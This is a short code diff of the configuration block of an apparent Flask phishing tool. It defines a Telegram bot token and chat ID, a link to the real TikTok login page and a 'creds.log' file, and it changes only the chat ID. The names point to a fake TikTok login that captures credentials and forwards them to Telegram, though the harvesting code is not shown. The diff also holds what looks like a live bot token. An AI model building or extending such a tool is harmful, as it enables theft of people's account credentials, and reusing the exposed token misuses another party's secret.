@@ -9,7 +9,7 @@ from flask import Flask, request, jsonify, render_template_string
 # КОНФИГ
 # ============================================================
 TELEGRAM_BOT_TOKEN = "9295589723:AAFJTyEU_OQg7VTBSRdhDTQLgzxNsKzdVUo"
-TELEGRAM_CHAT_ID   = "825813409"
+TELEGRAM_CHAT_ID   = "8258113409"
 REAL_TIKTOK        = "https://www.tiktok.com/login"
 LOG_FILE           = "creds.log"
 
